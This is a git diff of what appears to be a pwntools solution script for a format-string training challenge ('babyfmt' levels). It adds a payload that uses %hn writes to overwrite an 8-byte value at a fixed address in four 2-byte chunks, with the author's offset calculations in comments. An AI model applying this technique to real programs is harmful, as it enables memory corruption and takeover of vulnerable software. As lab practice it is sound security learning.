@@ -19,8 +19,23 @@ def level_4_1(p):
     data = b'%135x%24$n' + p64(0x404158)
     p.sendafter('Send your data!', data)
 
+def level_5_0(p):
+    '''Write 0x9f443fccff098e2a to 0x404138.
+    '''
+    #Little endian so 8e21 first, then ff09....
+    #add ff09 - 8e21 bytes to write ff09... still need to sub a little more, not sure why
+    #next overflow to write 3fcc...
+    # (0x10000 - 0xff09) + 0x3fcc
+    # 9f44 - 3fcc...
+    data = b'%36394x%43$hn' + \
+           b'%28895x%44$hn' + \
+           b'%16579x%45$hn' + \
+           b'%24440x%46$hn.....' + \
+           p64(0x404138) + p64(0x40413a) + p64(0x40413c) + p64(0x40413e)
+    p.sendafter('Send your data!', data)
 
-level = 4.1
+
+level = 5.0
 p = process(f'/challenge/babyfmt_level{level}')
 #p = gdb.debug(f'./babyfmt_level{level}', '''
 #b read
@@ -33,6 +48,6 @@ p = process(f'/challenge/babyfmt_level{level}')
 #c
 #''')
 
-level_4_1(p)
+level_5_0(p)
 
 p.interactive()
